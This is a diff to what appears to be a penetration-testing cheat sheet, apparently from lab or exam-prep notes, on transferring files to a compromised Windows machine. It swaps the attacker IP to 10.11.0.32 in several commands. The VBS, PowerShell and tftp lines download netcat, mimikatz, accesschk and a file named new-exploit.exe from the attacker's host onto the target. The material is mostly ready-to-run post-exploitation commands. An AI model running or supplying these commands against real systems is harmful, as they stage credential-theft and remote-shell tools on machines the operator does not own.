@@ -36,11 +36,11 @@ echo ts.Close >> wget.vbs
 
 > cscript wget.vbs http://YOURIP/file_to_send.txt C:\save\file\here.txt
 
-> cscript wget.vbs http://10.11.0.125/accesschk.exe C:\accesschk.exe
+> cscript wget.vbs http://10.11.0.32/accesschk.exe C:\accesschk.exe
 
-> cscript wget.vbs http://10.11.0.125/nc.exe C:\nc.exe
+> cscript wget.vbs http://10.11.0.32/nc.exe C:\nc.exe
 
-> cscript wget.vbs http://10.11.0.125/mimikatz.exe C:\mimikatz.exe
+> cscript wget.vbs http://10.11.0.32/mimikatz.exe C:\mimikatz.exe
 
 
 ## Powershell
@@ -48,7 +48,7 @@ echo ts.Close >> wget.vbs
 ```
 echo $storageDir = $pwd > wget.ps1
 echo $webclient = New-Object System.Net.WebClient >>wget.ps1
-echo $url = "http://YOUR_IP/evil.txt" >>wget.ps1
+echo $url = "http://10.11.0.32/evil.txt" >>wget.ps1
 echo $file = "new-exploit.exe" >>wget.ps1
 echo $webclient.DownloadFile($url,$file) >>wget.ps1
 ```
@@ -66,7 +66,7 @@ cp /file/you/want /tftp
 ```
 
 On Windows 
-> tftp -i --yourIP-- get file.exe
+> tftp -i 10.11.0.32 get file.exe
 
 
 
